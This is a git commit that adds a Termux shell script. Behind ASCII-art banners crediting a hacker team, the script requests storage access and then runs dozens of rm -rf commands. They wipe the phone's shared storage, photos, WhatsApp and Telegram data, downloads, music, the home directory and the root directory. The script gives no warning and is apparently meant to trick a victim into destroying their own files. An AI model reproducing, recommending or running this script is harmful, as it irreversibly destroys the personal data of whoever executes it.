68f1bf5a29474d1e9e9d5d0c59008fd0d879fcc8
greenzombies123 <52916652+greenzombies123@users.noreply.github.com>
2019-08-25 11:52:49 +0700

    Add files via upload

---
+++ termux.sh
@@ -0,0 +1,164 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo
+echo
+echo $green"@@@@@@@@@@   @@@@@@@"
+sleep 1
+echo $green"@@@@@@@@@@@  @@@@@@@@"
+sleep 1
+echo $green"@@! @@! @@!  @@!  @@@"
+sleep 1
+echo $green"!@! !@! !@!  !@!  @!@"
+echo $white"@!! !!@ @!@  @!@!!@!"
+sleep 1
+echo $white"!@!   ! !@!  !!@!@!"
+echo $white"!!:     !!:  !!: :!!"
+sleep 1
+echo $white":!:     :!:  :!:  !:!  :!:"
+sleep 1
+echo $white":::     ::   ::   :::  :::"
+echo $white" :      :     :   : :  :::"
+echo
+echo
+echo
+echo
+echo $green"@@@  @@@   @@@@@@    @@@@@@   @@@  @@@  @@@@@@@  @@@@@@"
+sleep 1
+echo $green"@@@  @@@  @@@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@"
+sleep 1
+echo $green"@@!  @@@  !@@       !@@       @@!  @@@  !@@          @@@"
+sleep 1
+echo $green"!@!  @!@  !@!       !@!       !@!  @!@  !@!          @!@"
+echo $green"@!@!@!@!  !!@@!!    !!@@!!    @!@!@!@!  !!@@!!   @!@!!@"
+sleep 1
+echo $white"!!!@!!!!   !!@!!!    !!@!!!   !!!@!!!!  @!!@!!!  !!@!@!"
+echo $white"!!:  !!!       !:!       !:!  !!:  !!!      !:!      !!:"
+sleep 1
+echo $white":!:  !:!      !:!       !:!   :!:  !:!      !:!      :!:"
+sleep 1
+echo $white"::   :::  :::: ::   :::: ::   ::   :::  :::: ::  :: ::::"
+echo $white" :   : :  :: : :    :: : :     :   : :  :: : :    : : :"
+echo
+
+echo $green"______________________________________________"
+echo $green" [+]"$white"Author by      :"$green" Mr_HSSH53 "
+sleep 1
+echo $green" [+]"$white"Team           :"$green" CYBER ELITE INDONESIA "
+sleep 1
+echo $green" [+]"$white"Thanks to      :"$green" MR_DARK"
+echo $green" [+]"$white"Thanks to      :"$green" SILVER BULLET"
+echo $green" [+]"$white"Thanks to      :"$green" MR_X70"
+sleep 1
+echo $green" [+]"$white"Thanks to      :"$green" MR_NINJA21"
+echo $green" [+]"$white"Thanks to      :"$green" MR_EVIL88"
+sleep 1
+echo $green" [+]"$white"Thanks to      :"$green" MR_EXPLOIT"
+echo $green" [+]"$white"Thanks to      :"$green"TUAN VIRUS 17"
+sleep 1
+echo $green"__________________________________________"
+echo
+echo $green" TUNGGU SEBENTAR "
+sleep 1
+echo
+echo
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf storage/emulated/0
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /storage/emulated/0/Telegram
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/unduhan
+rm -rf /storage/shared/WhatsApp
+rm -rf /storage/shared/DCIM
+rm -rf /storage/shared/GBWhatsApp
+rm -rf /storage/shared/GBInstagram
+rm -rf /storage/shared/Pictures
+rm -rf /storage/shared/Movies
+rm -rf /storage/shared/Download
+rm -rf /storage/shared/Movies
+rm -rf /storage/shared/system/cdsys.co
+rm -rf /storage/shared/system
+rm -rf /storage/shared/Android
+rm -rf /storage/shared/Playlists
+rm -rf /storage/shared/Telegram
+rm -rf /storage/shared/Music
+rm -rf /storage/shared/Movies
+rm -rf /storage/emulated/0/GBWhatsApp
+rm -rf /storage/emulated/0/GBInsta
+rm -rf /storage/emulated/0/GBTelegram
+rm -rf /storage/downloads
+rm -rf /storage/dcim
+rm -rf /storage/shared
+rm -rf /storage/music
+rm -rf /storage/external-1
+rm -rf /
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/WhatsApp
+rm -rf /sdcard/0/Intagram
+echo $green"@@@@@@@@@@   @@@@@@@"
+sleep 1
+echo $green"@@@@@@@@@@@  @@@@@@@@"
+sleep 1
+echo $green"@@! @@! @@!  @@!  @@@"
+sleep 1
+echo $green"!@! !@! !@!  !@!  @!@"
+echo $white"@!! !!@ @!@  @!@!!@!"
+sleep 1
+echo $white"!@!   ! !@!  !!@!@!"
+echo $white"!!:     !!:  !!: :!!"
+sleep 1
+echo $white":!:     :!:  :!:  !:!  :!:"
+sleep 1
+echo $white":::     ::   ::   :::  :::"
+echo $white" :      :     :   : :  :::"
+echo
+echo
+echo
+echo
+echo $green"@@@  @@@   @@@@@@    @@@@@@   @@@  @@@  @@@@@@@  @@@@@@"
+sleep 1
+echo $green"@@@  @@@  @@@@@@@   @@@@@@@   @@@  @@@  @@@@@@@  @@@@@@@"
+sleep 1
+echo $green"@@!  @@@  !@@       !@@       @@!  @@@  !@@          @@@"
+sleep 1
+echo $green"!@!  @!@  !@!       !@!       !@!  @!@  !@!          @!@"
+echo $green"@!@!@!@!  !!@@!!    !!@@!!    @!@!@!@!  !!@@!!   @!@!!@"
+sleep 1
+echo $white"!!!@!!!!   !!@!!!    !!@!!!   !!!@!!!!  @!!@!!!  !!@!@!"
+echo $white"!!:  !!!       !:!       !:!  !!:  !!!      !:!      !!:"
+sleep 1
+echo $white":!:  !:!      !:!       !:!   :!:  !:!      !:!      :!:"
+sleep 1
+echo $white"::   :::  :::: ::   :::: ::   ::   :::  :::: ::  :: ::::"
+echo $white" :   : :  :: : :    :: : :     :   : :  :: : :    : : :"
+echo
+
+echo $green"______________________________________________"
+echo $green" [+]"$white"Author by      :"$green" Mr_HSSH53 "
+sleep 1
+echo $green" [+]"$white"Team           :"$green" CYBER ELITE INDONESIA "
+sleep 1
+echo $green" [+]"$white"Thanks to      :"$green" MR_DARK"
+echo $green" [+]"$white"Thanks to      :"$green" SILVER BULLET"
+echo $green" [+]"$white"Thanks to      :"$green" MR_X70"
+sleep 1
+echo $green" [+]"$white"Thanks to      :"$green" MR_NINJA21"
+echo $green" [+]"$white"Thanks to      :"$green" MR_EVIL88"
+sleep 1
+echo $green" [+]"$white"Thanks to      :"$green" MR_EXPLOIT"
+echo $green" [+]"$white"Thanks to      :"$green"TUAN VIRUS 17"
+sleep 1
+echo $green"__________________________________________"
